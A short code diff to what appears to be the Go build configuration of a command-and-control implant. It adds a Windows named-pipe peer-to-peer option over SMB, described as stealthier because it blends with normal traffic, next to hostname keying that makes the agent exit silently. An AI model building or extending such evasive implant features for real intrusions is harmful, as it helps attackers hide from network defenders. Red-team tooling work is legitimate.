@@ -278,6 +278,13 @@ var payloadDefinition = agentstructs.PayloadType{
 			ParameterType: agentstructs.BUILD_PARAMETER_TYPE_STRING,
 		},
 		{
+			Name:          "namedpipe_bind_name",
+			Description:   "Optional: Named pipe P2P name (e.g. 'msrpc-f9a1'). Windows only. When set, the agent listens on a named pipe for parent connections via SMB (port 445). Stealthier than TCP — blends with normal Windows traffic. Leave empty to use TCP.",
+			Required:      false,
+			DefaultValue:  "",
+			ParameterType: agentstructs.BUILD_PARAMETER_TYPE_STRING,
+		},
+		{
 			Name:          "env_key_hostname",
 			Description:   "Optional: Environment key — regex pattern the hostname must match (e.g. '.*\\.contoso\\.com' or 'WORKSTATION-\\d+'). Agent exits silently before checkin if hostname doesn't match. Leave empty to skip.",
 			Required:      false,
@@ -700,6 +707,11 @@ func build(payloadBuildMsg agentstructs.PayloadBuildMessage) agentstructs.Payloa
 	// TCP P2P bind address
 	if tcpBind, err := payloadBuildMsg.BuildParameters.GetStringArg("tcp_bind_address"); err == nil && tcpBind != "" {
 		ldflags += fmt.Sprintf(" -X '%s.tcpBindAddress=%s'", fawkes_main_package, tcpBind)
+	}
+
+	// Named pipe P2P name (Windows only)
+	if pipeName, err := payloadBuildMsg.BuildParameters.GetStringArg("namedpipe_bind_name"); err == nil && pipeName != "" {
+		ldflags += fmt.Sprintf(" -X '%s.namedPipeBindName=%s'", fawkes_main_package, pipeName)
 	}
 
 	// Working hours opsec parameters
